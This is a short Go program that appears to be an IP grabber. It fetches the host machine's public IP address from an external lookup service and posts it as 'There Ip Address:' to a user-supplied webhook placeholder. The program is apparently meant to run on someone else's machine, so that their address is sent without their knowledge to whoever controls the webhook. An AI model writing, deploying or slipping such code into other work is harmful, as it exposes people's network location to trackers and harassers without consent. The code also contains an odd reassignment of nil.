package main

import (
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
)

func main() {
	urls := "Enter Webhook Here"
	pubg, nil := http.Get("https://api.myip.com")
	body, err := ioutil.ReadAll(pubg.Body)
	ip := string(body)
	data := url.Values{
		"content": {"There Ip Address:" + ip},
	}
	resp, err := http.PostForm(urls, data)

	if err != nil {
		log.Fatal(err, resp)
	}

}
